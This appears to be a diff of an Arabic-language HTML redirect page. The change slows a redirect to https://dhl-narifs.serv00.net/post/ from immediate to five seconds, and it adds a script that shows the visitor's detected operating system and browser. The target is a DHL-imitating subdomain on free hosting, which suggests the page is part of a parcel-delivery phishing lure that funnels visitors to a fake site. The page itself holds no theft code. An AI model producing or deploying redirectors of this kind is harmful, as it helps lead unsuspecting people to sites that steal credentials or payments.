@@ -1,23 +1,50 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إعادة توجيه الزوار</title>
+
+    <!-- كود إعادة التوجيه بعد 5 ثواني -->
+    <meta http-equiv="refresh" content="5; url=https://dhl-narifs.serv00.net/post/">
+    
     <!-- Google Analytics Tracking Code -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-GFJBR4414X"></script>
     <script>
       window.dataLayer = window.dataLayer || [];
       function gtag(){dataLayer.push(arguments);}
       gtag('js', new Date());
-
       gtag('config', 'G-GFJBR4414X');
     </script>
 
-    <!-- كود إعادة التوجيه -->
-    <meta http-equiv="refresh" content="0; url=https://dhl-narifs.serv00.net/post/">
-    <script type="text/javascript">
-        window.location.href = "https://dhl-narifs.serv00.net/post/";
-    </script>
 </head>
 <body>
-    <!-- يمكنك إضافة رسالة هنا في حال فشل التوجيه -->
+
+<h1>مرحبا بك في صفحة إعادة التوجيه!</h1>
+<p>سيتم توجيهك إلى الموقع المطلوب خلال 5 ثواني...</p>
+
+<h2>معلومات عن جهازك:</h2>
+<p id="info"></p>
+
+<script>
+    // الحصول على نوع المتصفح ونظام التشغيل
+    var userAgent = navigator.userAgent;
+    var os = "غير معروف";
+
+    if (userAgent.indexOf("Win") != -1) os = "Windows";
+    if (userAgent.indexOf("Mac") != -1) os = "MacOS";
+    if (userAgent.indexOf("Linux") != -1) os = "Linux";
+    if (userAgent.indexOf("Android") != -1) os = "Android";
+    if (userAgent.indexOf("like Mac") != -1) os = "iOS";
+
+    var browser = "غير معروف";
+    if (userAgent.indexOf("Chrome") != -1) browser = "Google Chrome";
+    if (userAgent.indexOf("Firefox") != -1) browser = "Mozilla Firefox";
+    if (userAgent.indexOf("Safari") != -1 && userAgent.indexOf("Chrome") == -1) browser = "Safari";
+    if (userAgent.indexOf("Edge") != -1) browser = "Microsoft Edge";
+
+    document.getElementById("info").innerHTML = "نظام التشغيل: " + os + "<br>" + "المتصفح: " + browser;
+</script>
+
 </body>
 </html>
